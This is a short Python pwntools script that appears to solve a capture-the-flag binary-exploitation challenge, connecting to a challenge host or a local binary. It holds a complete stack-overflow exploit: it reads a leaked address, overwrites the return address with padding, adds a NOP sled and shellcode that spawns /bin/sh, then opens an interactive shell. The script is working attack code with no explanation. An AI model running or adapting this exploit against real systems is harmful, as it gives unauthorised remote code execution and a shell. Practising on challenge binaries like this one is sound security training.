from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=34438
else:
   pass

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()

addr = p.recvline().strip(b'\n')
leak = int(addr.decode(),16)+150
log.info(f"Addr: {hex(leak)}")
pause()
chain = cyclic(120)
chain += p64(leak)
chain += asm(shellcraft.nop())*50
chain += asm(shellcraft.sh())

p.sendline(chain)
p.interactive()
